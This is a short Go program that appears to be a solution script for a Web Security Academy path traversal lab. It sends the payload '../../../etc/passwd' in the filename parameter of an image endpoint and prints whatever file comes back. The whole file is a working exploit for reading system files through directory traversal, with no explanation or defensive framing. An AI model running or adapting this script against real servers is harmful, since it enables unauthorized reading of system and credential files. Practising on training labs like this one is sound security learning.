package main

import 
	(
	"fmt"
	"net/http"
	"io/ioutil"
	)


func main() {

	payload := "../../../etc/passwd"
	url := "https://acc61f2c1e641833c021430100060072.web-security-academy.net/image?filename=" + payload
	method := "GET"
	
	fmt.Println("Url: " + url)

	client := &http.Client {
	}
	req, err := http.NewRequest(method, url, nil)
  
	if err != nil {
	  fmt.Println(err)
	  return
	}
	res, err := client.Do(req)
	if err != nil {
	  fmt.Println(err)
	  return
	}
	defer res.Body.Close()
  
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
	  fmt.Println(err)
	  return
	}
	fmt.Println(string(body))
}

